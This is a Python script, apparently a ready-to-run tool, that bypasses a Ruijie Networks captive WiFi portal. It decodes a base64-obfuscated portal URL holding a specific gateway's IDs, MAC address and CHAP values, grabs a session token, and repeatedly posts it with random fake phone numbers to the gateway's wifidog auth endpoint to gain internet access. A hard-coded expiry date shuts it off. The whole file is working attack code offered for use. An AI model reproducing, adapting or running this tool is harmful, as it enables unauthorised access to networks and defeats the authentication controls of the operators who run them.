#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import re
import time
import ping3
import base64
import random
import string
import asyncio
import aiohttp
from datetime import datetime

# ========== EXPIRATION CONFIGURATION ==========
EXPIRY_DATE = "2026-05-12"  # YYYY-MM-DD
EXPIRY_TIME = "15:30:00"     # HH:MM:SS
# ==============================================

w = "\033[1;00m"
g = "\033[1;32m"
y = "\033[1;33m"
r = "\033[1;31m"
b = "\033[1;34m"

def check_expiry():
    expiry_str = f"{EXPIRY_DATE} {EXPIRY_TIME}"
    expiry = datetime.strptime(expiry_str, "%Y-%m-%d %H:%M:%S")
    return datetime.now() > expiry

def clear():
    os.system("clear" if os.name == "posix" else "cls")

def Line():
    try:
        cols = os.get_terminal_size()[0]
    except:
        cols = 50
    print(f"{y}-" * cols + f"{w}")

def Logo():
    clear()
    logo = f"""{r},-_/         .     ,--. .        .
'  | . . ,-. |-   | `-' |  . ,-. | ,
   | | | `-. |    |   . |  | |   |<
   | `-^ `-' `'   `--'  `' ' `-' ' `
/` |
`--'  {g}              Ruijie Tool - EXPIRY EDITION\033[1;00m"""
    print(logo)
    Line()

async def get_session_id(session, session_url, previous_id=None):
    headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}
    try:
        async with session.get(session_url, headers=headers, timeout=10) as req:
            response = str(req.url)
            session_id = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", response).group(1)
            return session_id
    except:
        return previous_id

class InternetAccess:
    def __init__(self):
        self.session_url = base64.b64decode(b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ==').decode()
        try:
            self.ip = open(".ip", "r").read().strip()
        except:
            self.ip = "192.168.99.1"

    async def execute(self):
        # Check expiry first
        if check_expiry():
            Logo()
            print(f"{r}{'='*45}{w}")
            print(f"{r}  ⚠️ THIS SCRIPT HAS EXPIRED! ⚠️{w}")
            print(f"{r}{'='*45}{w}")
            print(f"{y}  Expired on: {EXPIRY_DATE} at {EXPIRY_TIME}{w}")
            input(f"\n{y}Press Enter to exit...{w}")
            return
        
        Logo()
        print(f"{g}[+] INTERNET ACCESS - EXPIRY MODE{w}")
        print(f"{y}[!] Expires on: {EXPIRY_DATE} at {EXPIRY_TIME}{w}")
        Line()
        
        async with aiohttp.ClientSession() as session:
            loop = 0
            session_id = None
            
            while True:
                if check_expiry():
                    print(f"\n{r}[!] Script has expired! Stopping...{w}")
                    break
                
                if loop % 5 == 0:
                    session_id = await get_session_id(session, self.session_url, session_id)
                
                if session_id:
                    params = {'token': session_id, 'phoneNumber': "".join(random.choice(string.digits) for _ in range(6))}
                    try:
                        async with session.post(f'http://{self.ip}:2060/wifidog/auth?', params=params) as res:
                            p = await asyncio.to_thread(ping3.ping, 'google.com')
                            ping_str = f"{g}{int(p*1000)}ms" if p else f"{r}Offline"
                            print(f"{w}[{datetime.now().strftime('%H:%M:%S')}] Status: {res.status} | Ping: {ping_str}{w}")
                    except: pass
                await asyncio.sleep(2)
                loop += 1

def main():
    Logo()
    print(f"{w}[1] Internet Access Mode (With Expiry)")
    print(f"{r}[0] Exit")
    Line()
    cmd = input(f"{y}Select >> {w}")
    
    if cmd == '1':
        asyncio.run(InternetAccess().execute())
    else:
        return

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{r}[!] Stopped.{w}")